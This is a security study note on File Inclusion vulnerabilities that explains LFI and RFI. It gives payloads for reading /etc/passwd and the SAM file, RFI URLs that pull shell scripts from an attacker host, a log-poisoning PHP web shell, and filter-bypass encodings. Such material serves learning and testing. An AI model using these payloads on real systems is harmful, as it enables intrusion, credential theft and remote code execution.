# Index
- [[Back End Vulnerabilities]]
	- [[1. Insecure File Uploads]]
	- [[2. File Inclusion]]
	- [[3. Command Injection]]
	- [[4. SQL Injection (SQLi)]]
	- [[5. Server-Side Request Forgery (SSRF)]]
	- [[6. Server-Side Template Injection (SSTi)]]
	- [[7. XML External Entity (XXE)]]
	- [[8. Insecure Deserialization]]

# File Inclusion

File Inclusion is a vulnerability that occurs when a web application allows user-controlled input to specify files that are then loaded or executed by the server. This can lead to attackers including arbitrary files, either locally from the server's file system or remotely via external URLs. There are two main types of File Inclusion vulnerabilities: **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)**.

- **Local File Inclusion (LFI):** This vulnerability allows an attacker to include files from the server's local file system. The attacker can read sensitive system files, expose application source code, or even execute code if the included file contains executable code (such as PHP or shell scripts).
  
- **Remote File Inclusion (RFI):** This vulnerability allows an attacker to include files hosted on remote servers. By injecting a URL into the vulnerable parameter, the attacker can load and execute code hosted on the attacker's server. This often leads to full remote code execution (RCE).

File Inclusion vulnerabilities are particularly dangerous because they provide direct access to files on the server, which can lead to sensitive data disclosure, code execution, or other serious security issues.

# How File Inclusion Works

1. **Identify Input Handling File Paths:**
   The vulnerability typically occurs in web applications that use user-supplied input in functions that load or include files. Common functions include:
   - PHP’s `include()`, `require()`, `include_once()`, and `require_once()` functions.
   - Other frameworks and languages have similar mechanisms (e.g., `file_get_contents()` in PHP, or template rendering in web frameworks like Django and Flask).
2. **Input Manipulation:**
   The attacker supplies a manipulated file path through query parameters or form fields. This can be a local path in LFI or a remote URL in RFI.
   - Example:
     ```php
     // vulnerable.php
     include($_GET['file']);
     ```
     An attacker can manipulate the `file` parameter to include arbitrary files.
3. **Inclusion of Files:**
   - In the case of **LFI**, the attacker tries to include files from the server’s filesystem. For example, `/etc/passwd` on Linux servers to retrieve user information.
   - In **RFI**, the attacker includes a remote file by supplying a URL. This remote file may contain malicious PHP code that gets executed on the server.
4. **Arbitrary Code Execution (RFI only):**
   When the server includes the remote file, if the file contains malicious code (like a web shell), the attacker gains remote code execution (RCE) on the target server.

# Types of File Inclusion

There are two primary types of File Inclusion vulnerabilities, each of which provides different levels of access and exploitation potential.

## Local File Inclusion (LFI)
- LFI occurs when the application allows the inclusion of files from the local file system. This can lead to sensitive information disclosure or code execution if log files or other writable files are accessible.

### How LFI Works
1. **File Path Injection:** The attacker injects a path to a file stored on the server, like `/etc/passwd` or log files.
2. **Inclusion of Arbitrary Files:** The server includes the specified file and displays or executes its contents.
3. **Sensitive Data Exposure:** The attacker gains access to sensitive files, such as configuration files, passwords, or even source code.

**Example:**
```
http://<target_domain>?page=../../../../etc/passwd
```
This injects a path to the `/etc/passwd` file, displaying its contents, which can leak sensitive user information.

## Remote File Inclusion (RFI)
- RFI occurs when the application allows the inclusion of files from remote locations (e.g., external URLs). This vulnerability is more severe than LFI because it allows attackers to include files they control, leading to remote code execution.

### How RFI Works
1. **Remote URL Injection:** The attacker injects a remote URL pointing to a malicious script, such as a web shell.
2. **Code Execution:** The server includes and executes the remote file, often giving the attacker full control over the server.
3. **Remote Code Execution:** The attacker can execute arbitrary commands or scripts by including malicious files hosted on a remote server.

**Example:**
```
http://<target_domain>?page=http://attacker.com/malicious_script.php
```
The server loads the external PHP script and executes it, allowing the attacker to run commands on the server.

# Manual Discovery Techniques for File Inclusion

Here are several manual techniques to discover and exploit File Inclusion vulnerabilities:

## Inspect Input Parameters
   - Review the application for any parameters that may be used to include files. Common parameters might be `page`, `file`, `document`, etc.
   - **Example:**
     ```
     http://<target_domain>?page=about
     ```

## Attempt Local File Inclusion (LFI)
   - Try injecting file paths to test for LFI. Common targets include `/etc/passwd`, `/var/log/apache2/access.log`, or `/proc/self/environ`.
   - **Example:**
     ```
     http://<target_domain>?page=../../../../etc/passwd
     ```

   If the content of the file is displayed, the application is vulnerable to LFI.

## Test for Remote File Inclusion (RFI)
   - Inject external URLs to test for RFI. Use your own remote server to host a malicious script and inject the URL into the vulnerable parameter.
   - **Example:**
     ```
     http://<target_domain>?page=http://<attack_ip>/shell.php
     ```

   If the server executes the remote file, the application is vulnerable to RFI.

## Fuzz for File Inclusion with Burp Suite or wfuzz
   - Use tools like Burp Suite to intercept HTTP requests and manipulate the file inclusion parameters.
   - Example:
     ```
     GET /index.php?page=about HTTP/1.1
     Host: <target_domain>
     ```

     Modify the request to test for LFI:
     ```
     GET /index.php?page=../../../../etc/passwd HTTP/1.1
     ```

   - Use `wfuzz` to automate fuzzing for LFI:
     ```
     wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/lfi.txt --hc 404 "http://<target_domain>?page=FUZZ"
     ```

# File Inclusion Payloads

Here are some common payloads used to exploit File Inclusion vulnerabilities:

## Basic LFI Payload (Linux)
   - Retrieve the content of `/etc/passwd` file:
     ```
     http://<target_domain>/vulnerable.php?file=/etc/passwd
     ```

## Basic LFI Payload (Windows)
   - Retrieve the content of the Windows SAM file:
     ```
     http://<target_domain>/vulnerable.php?file=C:\windows\system32\config\SAM
     ```

## Remote File Inclusion for Remote Code Execution
   - Inject a URL to a malicious script hosted on the attacker's server:
     ```
     http://<target_domain>/vulnerable.php?file=http://<attack_ip>/shell.txt
     ```

## PHP Code Injection via Log Poisoning
   - Poison web server logs with PHP code, then include the log file:
     ```
     <?php system($_GET['cmd']); ?>
     ```

   - Access the log file through LFI to execute the code:
     ```
     ../../../../var/log/apache2/access.log
     ```

## Execute Arbitrary Code via Environment Injection (LFI)
   - Some files like `/proc/self/environ` can be exploited to inject code:
     ```
     http://<target_domain>?page=../../../../proc/self/environ
     ```

   Inject environment variables to run code:
   ```
   <?php echo shell_exec('whoami'); ?>
   ```

## Log Poisoning for Code Execution via LFI
   - If the application logs data to files that are included via LFI, an attacker can inject code into the logs. This technique, known as log poisoning, allows for the execution of arbitrary code.
   - Example:
     1. Access a URL that is logged by the web server:
        ```
        http://<target_domain>?page=<?php system($_GET['cmd']); ?>
        ```
     2. Include the log file through LFI:
        ```
        http://<target_domain>?page=../../../../var/log/apache2/access.log
        ```

     The PHP code is executed when the log file is included.

# Bypassing Defenses

Here are some common techniques for bypassing defenses in File Inclusion attacks:

## Bypassing Input Validation Filters
   - Filters may block certain keywords like `/`, `.` or `http`. Use encoding techniques to bypass these filters:
     - URL Encoding:
       ```
       %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
       ```
     - Double URL Encoding:
       ```
       %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
       ```

## Bypassing File Extension Validation
   - Some applications validate file extensions but do not validate file paths. You can often bypass these filters using null byte injection (`%00`) or adding extensions to the path.
   - Example:
     ```
     ../../../../etc/passwd%0.jpg
     ../../../../etc/passwd%00.jpg
     ```

## Using PHP Wrappers for LFI
   - PHP supports wrappers that can be used to bypass filters or execute code via file inclusion:
   - `php://input`:
     ```
     http://<target_domain>/vulnerable.php?file=php://input
     ```
   - `php://filter`:
     ```
     http://<target_domain>/vulnerable.php?file=php://filter/convert.base64-encode/resource=index.php
     ```

## Data Sanitization Padding
   - Developers may use input validation by filtering keywords to prevent access.
   - Entry
     ```
     http://webapp.thm/index.php?lang=../../../../etc/passwd
     ```
   - Error Message Example
     ```
     Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
     ```
   - Exploit
     ```
     ..php?file=example....//....//....//….//etc/passwd
     ```
This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.

## Mixed Path Separators
   - Combine Unix and Windows path separators to evade filters.
     ```
     ..\/..\/..\/..\/etc\/passwd
     ```

# Resources

|**Website**|**URL**|
|-|-|
|OWASP File Inclusion|https://owasp.org/www-community/attacks/Path_Traversal|
|PortSwigger Web Security Academy|https://portswigger.net/web-security/file-path-traversal|
|PayloadAllTheThings (LFI/RFI)|https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion|
|HackTricks File Inclusion Guide|https://book.hacktricks.xyz/pentesting-web/file-inclusion|
|GTFOBins (LFI)|https://gtfobins.github.io/|
|Exploit Database File Inclusion Exploits|https://www.exploit-db.com/|
|PHP Wrappers Documentation|https://www.php.net/manual/en/wrappers.php|
|FuzzDB (LFI)|https://github.com/fuzzdb-project/fuzzdb|